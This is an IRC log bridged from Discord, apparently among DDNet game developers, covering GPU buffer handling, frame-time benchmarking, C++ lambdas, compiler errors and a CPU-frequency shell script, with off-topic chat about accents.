13:26 < bridge_> <totar> yes but they're using stupid words
13:26 < bridge_> <Solly (bun bun)> does ddnet release not use O3?
13:26 < bridge_> <totar> by database they mean server with database attached
13:27 < bridge_> <Jupstar ✪> afaik no
13:27 < bridge_> <Solly (bun bun)> does normal build use O3?
13:27 < bridge_> <Solly (bun bun)> still doesnt explain why ddnet builds are faster than mine xd
13:27 < bridge_> <Solly (bun bun)> still doesnt explain why ddnet.org builds are faster than mine xd
13:27 < bridge_> <Solly (bun bun)> (if we both use clang)
13:27 < bridge_> <Jupstar ✪> @sollybunny Last time i tested many apps with clang vs gcc (few years ago)
13:27 < bridge_> <Jupstar ✪> gcc has defs faster if you use stuff like LTO and weird optimization flags
13:27 < bridge_> <Jupstar ✪> But maybe clang is now better, dunno
13:28 < bridge_> <Jupstar ✪> Are they?
13:28 < bridge_> <Solly (bun bun)> i would have to test it myself cuz as you said it changes
13:28 < bridge_> <Jupstar ✪> ah ddnet uses gcc
13:28 < bridge_> <Jupstar ✪> pretty sure
13:28 < bridge_> <Solly (bun bun)> i am a bit jittery on my builds, whilst ddnet ones arent
13:28 < bridge_> <Solly (bun bun)> i havent tested max fps or anything
13:28 < bridge_> <Assa> for me also (with a lot of asteriks)
13:28 < bridge_> <Solly (bun bun)> i am a bit jittery on my builds, whilst ddnet ones arent (on a thinkpad l440)
13:29 < bridge_> <Solly (bun bun)> is there any way to extract data from a quad container (without voodoo witchcraft)
13:29 < bridge_> <Jupstar ✪> what u mean with data? the vertices?
13:29 < bridge_> <Solly (bun bun)> yeah
13:29 < bridge_> <Solly (bun bun)> and colors
13:29 < bridge_> <Jupstar ✪> it's not public, but they are stored indeed
13:29 < bridge_> <Jupstar ✪> for ogl 1.1 compat
13:30 < bridge_> <totar> they charge you per WASM instruction to run your game logic
13:30 < bridge_> <totar> https://cdn.discordapp.com/attachments/293493549758939136/1359852958900289758/image.png?ex=67f8fd42&is=67f7abc2&hm=c97ba15772cc49f86300d01412c3d297816023551a91411b691902abbb426bba&
13:30 < bridge_> <Solly (bun bun)> does opengl above that allow storing only on gpu?
13:30 < bridge_> <Jupstar ✪> ok discord dying in germany again
13:30 < bridge_> <Jupstar ✪> lel
13:30 < bridge_> <Solly (bun bun)> does opengl above that allow storing only on gpu? (or appending to existing data without full reupload)
13:30 < bridge_> <Solly (bun bun)> hi juppy
13:30 < bridge_> <Solly (bun bun)> 2 juppys ghasp
13:30 < bridge_> <Jupstar ✪> simply recreate the quad container then
13:31 < bridge_> <Jupstar ✪> it's not designed to be updated
13:31 < bridge_> <Jupstar ✪> and opengl memory management is also a weirdo
13:31 < bridge_> <Jupstar ✪> updating is often slower than just recreating the whole buffer xD
13:31 < bridge_> <Jupstar ✪> ofc depends on the size
13:31 < bridge_> <Solly (bun bun)> cant the gpu handle the realloc
13:31 < bridge_> <Solly (bun bun)> fully
13:31 < bridge_> <Jupstar ✪> i think the problem with updating is that it kinda blocks rendering
13:32 < bridge_> <Solly (bun bun)> yeah ofc
13:32 < bridge_> <Jupstar ✪> while a new buffer simply is unrelated memory and not in use yet
13:32 < bridge_> <Solly (bun bun)> uploading blocks no matter what
13:32 < bridge_> <Solly (bun bun)> atleast in opengl
13:32 < bridge_> <Assa> @jupeyy_keks do you have any good setup in measuring fps? I think the game needs some kinf of good benchmarking :/
13:32 < bridge_> <Solly (bun bun)> (idk why though, if memory is unused drm should be able to handle it)
13:32 < bridge_> <Assa> @jupeyy_keks do you have any good setup for measuring fps? I think the game needs some kinf of good benchmarking :/
13:32 < bridge_> <Solly (bun bun)> (idk why though, if memory is unused drm should be able to handle it, without adverse cache effects)
13:32 < bridge_> <Solly (bun bun)> go on the turkey multimap easy xd
13:32 < bridge_> <Solly (bun bun)> or play a demo
13:33 < bridge_> <Solly (bun bun)> does the client support 128p yet?
13:33 < bridge_> <Assa> and then, watch the fps counter with my eyes @sollybunny ? I would like an overview at the end of demo with stats: min fps, max fps, average fps, worst place x y  maybe or something
13:34 < bridge_> <Jupstar ✪> it has benchmark f1 cmd, but dunno. honestly the problem is that cpu performance is not consistent enough.
13:34 < bridge_> <Jupstar ✪> 
13:34 < bridge_> <Jupstar ✪> too much factors, like clock boosts etc.
13:34 < bridge_> <Solly (bun bun)> u can use cpufreq to set clock speed
13:34 < bridge_> <Solly (bun bun)> would be nice to get min/max/avg like in mc
13:34 < bridge_> <Solly (bun bun)> cl_showfps 2
13:34 < bridge_> <Jupstar ✪> it has no benchmarks as in benchmarking specific code regions
13:34 < bridge_> <Assa> well at least for my machine I should get similar results on average for the exact same test
13:35 < bridge_> <Jupstar ✪> yeah
13:35 < bridge_> <Jupstar ✪> best is to use entities and remove as much GPU rendering as possible ig
13:35 < bridge_> <Assa> you trolled me .... 🤣
13:36 < bridge_> <Solly (bun bun)> no im saying i want that as a feature xd
13:36 < bridge_> <Solly (bun bun)> just have a moving avg/min/max sampling like 50 poitns int he last 5 seconds
13:37 < bridge_> <oxyzo.> jupsta why are u an app
13:37 < bridge_> <Solly (bun bun)> uhmm actually its a webhook
13:37 < bridge_> <Jupstar ✪> but honestly assa, benchmarking if your changes make a difference sounds hard.
13:37 < bridge_> <Jupstar ✪> 
13:37 < bridge_> <Jupstar ✪> You need to write a benchmark where a single lambda or similar is the hot path.
13:37 < bridge_> <Jupstar ✪> 
13:37 < bridge_> <Jupstar ✪> Just measuring fps will not give you any clue. You can use a profile and see how much time was spent on some instructions
13:37 < bridge_> <oxyzo.> botstar
13:37 < bridge_> <Jupstar ✪> I am no app :c
13:37 < bridge_> <Solly (bun bun)> (use a profiler)
13:37 < bridge_> <Solly (bun bun)> (very informative)
13:37 < bridge_> <Jupstar ✪> on windows i dunno what i'd use
13:37 < bridge_> <Solly (bun bun)> visual studio has a really good line by line profiler but its locked behind visual studio
13:37 < bridge_> <Jupstar ✪> valgrind makes it easy to run in a cpu limit xD
13:38 < bridge_> <Solly (bun bun)> (it could be a vsc extension but ms is playing)
13:38 < bridge_> <Jupstar ✪> valgrind --tool=callgrind
13:38 < bridge_> <Solly (bun bun)> cpufreq 0.8
13:38 < bridge_> <Solly (bun bun)> ```sh
13:38 < bridge_> <Solly (bun bun)> #!/bin/sh
13:38 < bridge_> <Solly (bun bun)> 
13:38 < bridge_> <Solly (bun bun)> # Check if an argument is provided
13:38 < bridge_> <Solly (bun bun)> if [ -z "$1" ]; then
13:38 < bridge_> <Solly (bun bun)>     echo "Usage: $0 <GHz>"
13:38 < bridge_> <Solly (bun bun)>     exit 1
13:38 < bridge_> <Solly (bun bun)> fi
13:38 < bridge_> <Solly (bun bun)> 
13:38 < bridge_> <Solly (bun bun)> # Convert the argument to KHz
13:38 < bridge_> <Solly (bun bun)> frequency=$(echo "$1 * 1000000" | bc)
13:38 < bridge_> <Solly (bun bun)> 
13:38 < bridge_> <Solly (bun bun)> # Set CPU frequency
13:38 < bridge_> <Solly (bun bun)> if sudo cpupower frequency-set -u "$frequency" > /dev/null 2>&1; then
13:38 < bridge_> <Solly (bun bun)>     echo "CPU max frequency set to $1 GHz"
13:38 < bridge_> <Solly (bun bun)> else
13:38 < bridge_> <Solly (bun bun)>     echo "Failed"
13:39 < bridge_> <Solly (bun bun)>     exit $?
13:39 < bridge_> <Solly (bun bun)> fi
13:39 < bridge_> <Solly (bun bun)> ```
13:39 < bridge_> <Solly (bun bun)> ^ epic script to add to your thermally throttled laptop
13:39 < bridge_> <Jupstar ✪> would that be 80% or 0.8 ghz? xd
13:39 < bridge_> <Solly (bun bun)> 0.8ghz :)
13:39 < bridge_> <Solly (bun bun)> `permit nopass :wheel cmd cpupower` and this in `doas.conf` (if you use sudo, then figure it out urself)
13:39 < bridge_> <Jupstar ✪> my minimum is 3ghz apparently
13:39 < bridge_> <Solly (bun bun)> ;----;
13:40 < bridge_> <Solly (bun bun)> thats quite high
13:40 < bridge_> <Solly (bun bun)> (minimum clock speed i pressume)
13:40 < bridge_> <Assa> I like the idea of just setting cl_fpsbenchmark and if you start a demo a window pops up at the end with an overview
13:40 < bridge_> <Jupstar ✪> yes, maximum is 5.88ghz, but i never seen it above 5.7, so i think the reporting is simply wrong xd
13:41 < bridge_> <Assa> or add a benchmark button in the demoplayer, so anyone can benchmark if they want to
13:41 < bridge_> <Jupstar ✪> you can probably use mangohud to do benchmarking
13:41 < bridge_> <Jupstar ✪> no need for client support
13:41 < bridge_> <Jupstar ✪> but honestly, use a profiler xd
13:42 < bridge_> <Jupstar ✪> the one in visual studio is quite good, if you have that
13:42 < bridge_> <Solly (bun bun)> can you add triangles instead of quads to quad containers?
13:42 < bridge_> <Solly (bun bun)> feels a bit miff having 1/4 of my points be useless
13:42 < bridge_> <Jupstar ✪> no
13:42 < bridge_> <Jupstar ✪> A quad is 2 triangles tho
13:42 < bridge_> <Solly (bun bun)> yeah but i want to draw triangles
13:42 < bridge_> <Jupstar ✪> Can't remember but I think it supports freeform quads xdd
13:43 < bridge_> <Jupstar ✪> yeah no sry xd
13:43 < bridge_> <Solly (bun bun)> it does, i just have 1 point equal to the last
13:43 < bridge_> <Jupstar ✪> Create a triangle container
13:43 < bridge_> <Solly (bun bun)> i assume its rendering twice the triangles i need
13:43 < bridge_> <Assa> Or i just press ALT + R and the nvidia benchmarking opens 🙈
13:43 < bridge_> <Solly (bun bun)> fucking mosqutio bit my finger
13:43 < bridge_> <Solly (bun bun)> what a bih
13:44 < bridge_> <Jupstar ✪> ok anyway i've todo now, cya
13:44 < bridge_> <Solly (bun bun)> bb
13:49 < bridge_> <Solly (bun bun)> is it better to delete a quad container or reset it?
13:49 < bridge_> <Solly (bun bun)> (if i need a pool of quad containers)
13:52 < bridge_> <Assa> ddnet only uses a single cpu core for rendering right? At least I now know, that I am cpu "bottlenecked" in ddnet
13:55 < bridge_> <.c.f.m.> yeah it uses only a single cpu core
14:11 < ws-client> <ChillerDragon> @teero777 vc before GTA 6
14:22 < bridge_> <Solly (bun bun)> ```cpp
14:22 < bridge_> <Solly (bun bun)> // Update age of items, delete old items, render items
14:22 < bridge_> <Solly (bun bun)> m_vItems.remove_if([&](CBgDrawItem &Item)
14:22 < bridge_> <Solly (bun bun)> {
14:22 < bridge_> <Solly (bun bun)>     // If this item is currently selected
14:22 < bridge_> <Solly (bun bun)>     if(std::any_of(std::begin(m_apActiveItems), std::end(m_apActiveItems), [&](const std::optional<CBgDrawItem *> &ActiveItem) {
14:22 < bridge_> <Solly (bun bun)>         return ActiveItem.value_or(nullptr) == &Item;
14:22 < bridge_> <Solly (bun bun)>     }))
14:22 < bridge_> <Solly (bun bun)>         Item.m_SecondsAge = 0.0f;
14:22 < bridge_> <Solly (bun bun)>     else
14:22 < bridge_> <Solly (bun bun)>         Item.m_SecondsAge += aDelta[Item.m_Dummy];
14:22 < bridge_> <Solly (bun bun)>     if(Item.m_SecondsAge > (float)g_Config.m_ClBgDrawFadeTime)
14:22 < bridge_> <Solly (bun bun)>         return true;
14:22 < bridge_> <Solly (bun bun)>     Item.Render();
14:22 < bridge_> <Solly (bun bun)>     return false;
14:22 < bridge_> <Solly (bun bun)> });
14:22 < bridge_> <Solly (bun bun)> ```
14:22 < bridge_> <Solly (bun bun)> am i winning guys
14:23 < bridge_> <Assa> are you just stacking lambdas
14:23 < bridge_> <Solly (bun bun)> this is very functional
14:23 < bridge_> <pioooooo> https://cdn.discordapp.com/attachments/293493549758939136/1359866367523950612/663328b7b90737387edd5b7adb131e6d.jpg?ex=67f909bf&is=67f7b83f&hm=916737963ddc80a79c3c9a077b7271fc25b5775b90a2d350470241f473914587&
14:23 < bridge_> <Solly (bun bun)> idk functional code makes me feel like a wizard
14:24 < bridge_> <Assa> i think you can early exit if m_SecondsAge is 0
14:24 < bridge_> <Solly (bun bun)> no since i need to render if its not deleted
14:24 < bridge_> <Assa> I hope g_Config.m_clBgDrawFadeTime is never negative
14:24 < bridge_> <Solly (bun bun)> no its min value is 0
14:24 < bridge_> <Assa> oh yeah it's the other way round :nouis:
14:24 < bridge_> <Solly (bun bun)> in which case the comparison shouldnt be done
14:24 < bridge_> <pioooooo> java data streams are also like this
14:24 < bridge_> <pioooooo> but that's java
14:25 < bridge_> <Solly (bun bun)> data streams in all languages are very good at being processed in a functional way
14:25 < bridge_> <Solly (bun bun)> or streams in general
14:25 < bridge_> <pioooooo> idk but in c++ range is like too late
14:25 < bridge_> <Solly (bun bun)> see posix shell, cpp io, js http
14:26 < bridge_> <Solly (bun bun)> all very functional
14:26 < bridge_> <Solly (bun bun)> the ranges thing cpp has is very hard for me to figure out due to type shenangs
14:26 < bridge_> <Solly (bun bun)> the concept i understand
14:27 < bridge_> <pioooooo> :nouis:
14:28 < bridge_> <Solly (bun bun)> all of the new cpp functional stuff is to 
14:28 < bridge_> <Solly (bun bun)> 1. offer functional paradims
14:28 < bridge_> <Solly (bun bun)> 2. tell the compiler exactly what your doing
14:28 < bridge_> <Solly (bun bun)> for 2.
14:28 < bridge_> <Solly (bun bun)> any_of is far more explicit than a loop
14:28 < bridge_> <Solly (bun bun)> i think it also hopes to let the compiler do more optimizations
14:28 < bridge_> <Solly (bun bun)> but im very scared it just increases compile time and isnt any better xd
14:28 < bridge_> <Solly (bun bun)> its far easier to read though
14:28 < bridge_> <Solly (bun bun)> (for what im doing)
14:31 < bridge_> <Solly (bun bun)> converting between my "old style" code and new style code is very hard
14:31 < bridge_> <Solly (bun bun)> though
14:32 < bridge_> <Solly (bun bun)> shoulda done stuff more incrementally
14:32 < bridge_> <Jupstar ✪> it uses main thread + 1 thread for the backend + 3 rendering threads if you use vk (can be controlled by some cfg var)
14:34 < bridge_> <Solly (bun bun)> can vk do uploading threaded?
14:34 < bridge_> <Jupstar ✪> to a certain extend yes, to a certain no
14:35 < bridge_> <Jupstar ✪> you can allocate memory threaded, but filling it requires cmds, and cmds must be queued to a queue and this queue requires a lock, thus it's at least also blocking the rendering stuff during filling the queue
14:35 < bridge_> <Solly (bun bun)> darn
14:36 < bridge_> <Solly (bun bun)> but the command is cheap
14:36 < bridge_> <Solly (bun bun)> memory uploading is async these days
14:36 < bridge_> <Solly (bun bun)> right
14:37 < bridge_> <Jupstar ✪> not that i'm aware of
14:37 < bridge_> <Jupstar ✪> inside the driver maybe
14:38 < bridge_> <Solly (bun bun)> doesnt dma (direct memory access) mean its non blocking
14:39 < bridge_> <Jupstar ✪> what? xd
14:41 < bridge_> <Jupstar ✪> in any way it depends on your memory design anyway.
14:41 < bridge_> <Jupstar ✪> 
14:41 < bridge_> <Jupstar ✪> a soc vram can probably do it basically like a CPU.. just fill the memory and use it
14:41 < bridge_> <Jupstar ✪> but discrete gpus require it to copy from host memory to device memory.
14:42 < bridge_> <Solly (bun bun)> would be nice if igpus could use memory without having to copy it
14:42 < bridge_> <Jupstar ✪> you can use coherent memory between host & device, but in my experience it's slow. i dunno if it directly uses the pcie bus to write memory
14:42 < bridge_> <Solly (bun bun)> that is atleast not cpu involved anymore with dma
14:42 < bridge_> <Solly (bun bun)> but i see no reason why it should be gpu involved
14:42 < bridge_> <Solly (bun bun)> apart from cache shenanigans
14:42 < bridge_> <Jupstar ✪> it's not about the gpu
14:42 < bridge_> <ryozuki> i think macos silicon shared memory
14:42 < bridge_> <ryozuki> shares
14:42 < bridge_> <Jupstar ✪> it's about how the driver should handle it
15:03 < bridge_> <Assa> hmm do you have the cfg var for me?
15:04 < bridge_> <Jupstar ✪> gfx_***thread_count
15:04 < bridge_> <Assa> gfx_render_thread_count
15:07 < bridge_> <Assa> this config doesn't do anything for me xD I can set it to 1, I can set it to 12, all the same, vulkan might ignore it
15:08 < bridge_> <Jupstar ✪> you have to restart client
15:08 < bridge_> <Assa> I did
15:08 < bridge_> <learath2> Ah, now that I'm on a larger screen I see why your lambda captures were crashing
15:08 < bridge_> <learath2> They are static lambdas, the closure object is initialized only once
15:08 < bridge_> <Assa> I actually guessed that this was the case :/
15:09 < bridge_> <Jupstar ✪> on a backend demanding (many draw calls) scenario it was more consistent than lower threads for me:
15:09 < bridge_> <Jupstar ✪> https://user-images.githubusercontent.com/6654924/153448356-941222a3-8bd3-424d-8685-a43389a4f691.png
15:09 < bridge_> <Jupstar ✪> That was back on my ryzen 3950x
15:09 < bridge_> <ryozuki> i got a project idea
15:09 < bridge_> <learath2> You could just remove the static, it shouldn't matter in terms of optimization as far as I can think
15:09 < bridge_> <ryozuki> but wont tell until i have something usable
15:09 < bridge_> <ryozuki> in case i get lazy
15:09 < bridge_> <ryozuki> ddnet related
15:10 < bridge_> <Assa> how did you obtain the frametimes (I know you plotted with matplotlib)
15:10 < bridge_> <Assa> how did you obtain the frametimes (I know you plotted with matplotlib)?
15:10 < bridge_> <Jupstar ✪> with the benchmark f1 cmd
15:11 < bridge_> <Assa> didn't I ask for a command like this D:
15:12 < bridge_> <Assa> did you do this consistently with a demo? Now All left to do is just start a demo with like 5 seconds
15:13 < bridge_> <Jupstar ✪> I think it was a demo yeah
15:13 < bridge_> <Assa> bind x "demo_play; benchmark_quit <something>"
15:14 < bridge_> <Jupstar ✪> i already told you about it today xD
15:14 < bridge_> <Jupstar ✪> ^
15:15 < bridge_> <Assa> I read this as "it has a benchmark f1 cmd, cl_showfps 2" and thought you trolled me
15:15 < bridge_> <Jupstar ✪> our discussion was chaos anyway xD
15:17 < bridge_> <Assa> `--config Release --target game-client -j 18 --` I wonder why cmake detects 18 cores when I have an 8 core processor
15:17 < bridge_> <learath2> You probably have 2 threads per core
15:18 < bridge_> <Assa> 2 * 8 = 18, yes
15:18 < bridge_> <learath2> +1 extra per core to make sure it stays saturated
15:18 < bridge_> <learath2> 2 * (8 + 1) = 18, sorted
15:18 < bridge_> <Assa> hmm alright
15:20 < bridge_> <Solly (bun bun)> see it, say it, sort it
15:21 < bridge_> <learath2> It's supposed to be "see it, say it, sorted" 😄
15:21 < bridge_> <Assa> see issue, solve issue, see 2 issues
15:22 < bridge_> <learath2> It is an educated guess btw, only way to find out the real answer is to look at manuals/code
15:22 < bridge_> <Solly (bun bun)> oops
15:22 < bridge_> <Solly (bun bun)> darn youre just more bri'ish than me
15:23 < bridge_> <Solly (bun bun)> "uaaah plz miend the trein btwn teh treain & teh plabfowm"
15:23 < bridge_> <Solly (bun bun)> "uaaah plz miend the trein btwn teh gap & teh plabfowm"
15:23 < bridge_> <learath2> They burnt it into my brain in the tube
15:23 < bridge_> <Solly (bun bun)> i thought that was c2c only
15:24 < bridge_> <Solly (bun bun)> that had it on the pa
15:24 < bridge_> <Solly (bun bun)> default website
15:24 < bridge_> <Solly (bun bun)> https://cdn.discordapp.com/attachments/293493549758939136/1359881721570398309/image.png?ex=67f9180b&is=67f7c68b&hm=df3316a385287a8af8bf5e204afd9b1002ea7f0d1ad29ebd2eeeb94789be98c0&
15:25 < bridge_> <Assa> @jupeyy_keks I now have a huge file containg lots of lines with nano seconds of frame times, what kind of format is this. Am I right to assume, that it contains a number for each frame drawn for 10 seconds?
15:26 < bridge_> <Jupstar ✪> yes, the format is smth that can be parsed by the pts benchmarking tool
15:27 < bridge_> <Jupstar ✪> but i am sure you can parse it too xd
15:27 < bridge_> <Solly (bun bun)> std::list has size but
15:27 < bridge_> <Solly (bun bun)> std::forward_list doesnt ):<
15:28 < bridge_> <Assa> I just hope its always "Frametime <number> ns" and never ever has something else xD
15:28 < bridge_> <Jupstar ✪> should be
15:39 < bridge_> <ryozuki> colour
15:39 < bridge_> <Jupstar ✪> :cammostripes:
15:39 < bridge_> <ryozuki> chips
15:43 < bridge_> <Assa> I was wondering why my average result looked so shit:
15:43 < bridge_> <Assa> https://cdn.discordapp.com/attachments/293493549758939136/1359886560920866976/shit_results.png?ex=67f91c8d&is=67f7cb0d&hm=37fc8071ff2a2e442820c937962c5c2a38c9d9a3d0a383f195ff99a9f52867dc&
15:44 < bridge_> <Assa> well ... xD guess I have to exclude first few thousand results
15:44 < bridge_> <Jupstar ✪> yeah
15:45 < bridge_> <Solly (bun bun)> colour is spelt wrong, everyone here sais "culuh"
15:45 < bridge_> <ryozuki> @patiga have u tried to integrate twgpu with egui
15:45 < bridge_> <ryozuki> looking into it
15:47 < bridge_> <Solly (bun bun)> ```cpp
15:47 < bridge_> <Solly (bun bun)> Tp1> >::construct(allocator_type&, _Up*, _Args&& ...) [with _Up = CBgDrawPoint; _Args = {vector2_base<float>&}; _Tp = CBgDrawPoint; allocator_type = std::allocator<CBgDrawPoint>]’
15:47 < bridge_> <Solly (bun bun)> no matching function for call to ‘CBgDrawPoint::CBgDrawPoint(vector2_base<float>&)’
15:47 < bridge_> <Solly (bun bun)>   191 |         { ::new((void *)__p) _Up(std::forward<_Args>(__args)...); }
15:47 < bridge_> <Solly (bun bun)>       |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
15:47 < bridge_> <Solly (bun bun)> /home/solly/Code/ddnet/src/game/client/components/tclient/bg_draw.cpp:18:7: note: candidate: ‘CBgDrawPoint::CBgDrawPoint()’
15:47 < bridge_> <Solly (bun bun)>    18 | class CBgDrawPoint
15:47 < bridge_> <Solly (bun bun)>       |       ^~~~~~~~~~~~
15:47 < bridge_> <Solly (bun bun)> /home/solly/Code/ddnet/src/game/client/components/tclient/bg_draw.cpp:18:7: note:   candidate expects 0 arguments, 1 provided
15:47 < bridge_> <Solly (bun bun)> /home/solly/Code/ddnet/src/game/client/components/tclient/bg_draw.cpp:18:7: note: candidate: ‘constexpr CBgDrawPoint::CBgDrawPoint(const CBgDrawPoint&)’
15:47 < bridge_> <Solly (bun bun)> /home/solly/Code/ddnet/src/game/client/components/tclient/bg_draw.cpp:18:7: note:   no known conversion for argument 1 from ‘vector2_base<float>’ to ‘const CBgDrawPoint&’
15:47 < bridge_> <Solly (bun bun)> ```
15:47 < bridge_> <Solly (bun bun)> part of an average cpp error for "you forgot some arguments in the constructor"
15:47 < bridge_> <Jupstar ✪> the only 2 kinds of ppl that use colour are:
15:47 < bridge_> <Jupstar ✪> - british
15:47 < bridge_> <Jupstar ✪> - french
15:47 < bridge_> <Jupstar ✪> xD
15:47 < bridge_> <Solly (bun bun)> its just silly
15:47 < bridge_> <Solly (bun bun)> we should reform spelling at the same time we do speach
15:47 < bridge_> <Jupstar ✪> @sollybunny be honest do you generally prefer british pronounce over american?
15:48 < bridge_> <Solly (bun bun)> an american american accident makes me uncomfortable
15:48 < bridge_> <Solly (bun bun)> an american from youtube accent is fine
15:48 < bridge_> <Solly (bun bun)> i prefer posh proper british
15:49 < bridge_> <Solly (bun bun)> like from a language nerd in cambridge not from stuckup royalty
15:49 < bridge_> <Solly (bun bun)> scottish and irish accents dont ick me, but i have trouble understanding them
15:49 < bridge_> <Jupstar ✪> there are defs word where i sometimes say it more british sometimes for american.
15:49 < bridge_> <Jupstar ✪> 
15:49 < bridge_> <Jupstar ✪> best example is "either".
15:49 < bridge_> <Jupstar ✪> 
15:50 < bridge_> <Jupstar ✪> either that sounds more like e is somehow easier to use during a sentence, while i prefer "I ther" at the start of a sentence
15:50 < bridge_> <Solly (bun bun)> either and ither have different uses for me
15:50 < bridge_> <Jupstar ✪> there are defs word where i sometimes say it more british sometimes more american.
15:50 < bridge_> <Jupstar ✪> 
15:50 < bridge_> <Jupstar ✪> best example is "either".
15:50 < bridge_> <Jupstar ✪> 
15:50 < bridge_> <Jupstar ✪> either that sounds more like e is somehow easier to use during a sentence, while i prefer "I ther" at the start of a sentence
15:50 < bridge_> <Solly (bun bun)> i do not know the rules
15:50 < bridge_> <Solly (bun bun)> i use both but not interchangably
15:50 < bridge_> <Solly (bun bun)> maybe ither is for emphasis like thee
15:51 < bridge_> <Jupstar ✪> yeah probs
15:51 < bridge_> <Solly (bun bun)> less posh british (from what you would find in a pub or chip shop) as well as "from the hood" do ick me
15:51 < bridge_> <Solly (bun bun)> i can understand the former tho
15:51 < bridge_> <Solly (bun bun)> i have problems with understanding people a lot, its really annoying, i wish people had subtitles xd
15:53 < bridge_> <Solly (bun bun)> less posh british (from what you would find in a pub or chip shop or avg school [i think]) as well as "from the hood" do ick me
15:53 < bridge_> <Solly (bun bun)> i can understand the former tho
15:53 < bridge_> <Jupstar ✪> wtf xD
15:53 < bridge_> <Jupstar ✪> 
15:53 < bridge_> <Jupstar ✪> are you even native british speaker?
15:53 < bridge_> <Solly (bun bun)> less posh english accents (from what you would find in a pub or chip shop or avg school [i think]) as well as "from the hood" do ick me
15:53 < bridge_> <Solly (bun bun)> i can understand the former tho
15:54 < bridge_> <Solly (bun bun)> yes, but i have (self diagonosed) {auditory} dyslexia
15:54 < bridge_> <Jupstar ✪> i have: my brain always thinks smth different than i actually type in syndrom
15:55 < bridge_> <Solly (bun bun)> i think much faster than i type, so i often have a few seconds to think about it even if im not a "think before you speak" kinda person
15:56 < bridge_> <Solly (bun bun)> i (as most people) think much faster than i type, so i have a few seconds to think about it even if im not a "think before you speak" kinda person
15:56 < bridge_> <Solly (bun bun)> i used to type a lot worse though
15:56 < bridge_> <Solly (bun bun)> speaking is hard, you cant edit what you say half way through without confusion
15:59 < bridge_> <Solly (bun bun)> this is very #off-topic
15:59 < bridge_> <Jupstar ✪> developing my english skillz
16:00 < bridge_> <Solly (bun bun)> ugh why cant u make a list of something of unknown size
16:05 < bridge_> <ryozuki> @patiga ur vek in twgpu is outdated :d
16:05 < bridge_> <ryozuki> so i need to use a older version to match
16:06 < bridge_> <ryozuki> lib.rs(920, 1): two different versions of crate `wgpu` are being used; two types coming from two different versions of the same crate are different types even if they look the same
16:06 < bridge_> <ryozuki> tw_render_pass.rs(16, 12): associated function defined here
16:06 < bridge_> <Assa> frametimes with different rendering options. blue is the old rendering, so I am doing shit rn
16:06 < bridge_> <Assa> https://cdn.discordapp.com/attachments/293493549758939136/1359892219154137138/RenderComparison.png?ex=67f921d2&is=67f7d052&hm=d34259c92edf446d694399a525a101902bce531d10f78766d1f6f4434453d634&
16:06 < bridge_> <ryozuki> omg
16:06 < bridge_> <ryozuki> u also use a older wgpu
16:06 < bridge_> <ryozuki> xD
16:06 < bridge_> <patiga> no. someone else tried and stopped trying a year ago or so
16:06 < bridge_> <ryozuki> im trying rn
16:06 < bridge_> <Assa> btw @sollybunny I was checking with and without lambda, and the lambda is slower
16:06 < bridge_> <patiga> you can go on the master branch if you like
16:06 < bridge_> <ryozuki> is master updated
16:07 < bridge_> <patiga> its on 24 wgpu, no?
16:07 < bridge_> <ryozuki> vek is outdated let me see wgpu
16:07 < bridge_> <Solly (bun bun)> is it not inlined?
16:07 < bridge_> <ryozuki> ye wgpu is ok
16:08 < bridge_> <patiga> I don't think you'll be missing any vek features ^^
16:08 < bridge_> <Assa> the difference is miniscule tho, so the rendering issue comes from somewhere different
16:08 < bridge_> <Assa> ```
16:08 < bridge_> <Assa> Number Frametimes New w. Lambda: 13079
16:08 < bridge_> <Assa> Average New w. Lambda: 386.1872467314015
16:08 < bridge_> <Assa> Max New w. Lambda: 665
16:08 < bridge_> <Assa> Min New w. Lambda: 270
16:08 < bridge_> <Assa> Number Frametimes New n. Lambda: 13252
16:08 < bridge_> <Assa> Average New n. Lambda: 386.839118623604
16:08 < bridge_> <Assa> Max New n. Lambda: 663
16:08 < bridge_> <Assa> Min New n. Lambda: 258
16:09 < bridge_> <Assa> ```
16:09 < bridge_> <Solly (bun bun)> that might just be random error
16:09 < bridge_> <ryozuki> its just i liek to be on latest shiniest
16:09 < bridge_> <ryozuki> the thing im trying to do but probs will not do is tweditor
16:09 < bridge_> <Assa> 200 frames is 2 sigma, so not significant
16:09 < bridge_> <ryozuki> maybe there is another one doing it
16:09 < bridge_> <ryozuki> but this is my own with egui
16:09 < bridge_> <Assa> 200 frames is 2 sigma, so not significant, fo a physicist
16:09 < bridge_> <Assa> 200 frames is 2 sigma, so not significant, for a physicist
16:10 < bridge_> <patiga> there is the web editor I guess
16:10 < bridge_> <ryozuki> is it native
16:10 < bridge_> <ryozuki> or its built on js
16:10 < bridge_> <patiga> js ^^
16:10 < bridge_> <patiga> good luck, cool project :D
16:10 < bridge_> <ryozuki> ill try to finish it
16:10 < bridge_> <ryozuki> first i need to get twgpu to work with egui eframe
16:10 < bridge_> <Solly (bun bun)> idk what the units are
16:11 < bridge_> <Assa> x axis is just frame ID, y axis is frametime
16:11 < bridge_> <Solly (bun bun)> this is not a table
16:11 < bridge_> <Assa> what unit do you now understand?
16:12 < bridge_> <Solly (bun bun)> all of them
16:12 < bridge_> <Assa> or do you mean `us`
16:12 < bridge_> <Assa> so nanoseconds?
16:12 < bridge_> <Solly (bun bun)> there are no units given
16:13 < bridge_> <Solly (bun bun)> (us is microseconds)
16:13 < bridge_> <Assa> (I only not it as `µs`
16:13 < bridge_> <Assa> (I only not it as `µs`)
16:13 < bridge_> <Solly (bun bun)> (what)
16:14 < bridge_> <Solly (bun bun)> am i being trolled
16:14 < bridge_> <Assa> (`us` = country, `µs` = microseconds :kek: )
16:14 < bridge_> <Solly (bun bun)> typically when you are talking about `us` in the context of time its microseconds
16:14 < bridge_> <Solly (bun bun)> anyway
16:14 < bridge_> <Solly (bun bun)> what are the units
16:14 < bridge_> <Solly (bun bun)> in here
16:14 < bridge_> <Assa> you asked for the units? Frametime in microseconds?
16:15 < bridge_> <Solly (bun bun)> That's only 70fps
16:15 < bridge_> <Solly (bun bun)> What's the other unit
16:16 < bridge_> <Assa> no that cant be, should be in the thousands
16:16 < bridge_> <Assa> give me a sec
16:16 < bridge_> <Solly (bun bun)> As nanoseconds it's 79kfps
16:17 < bridge_> <Assa> 1s / 390 µs = 2 564.10256 (fps)
16:17 < bridge_> <Assa> ??
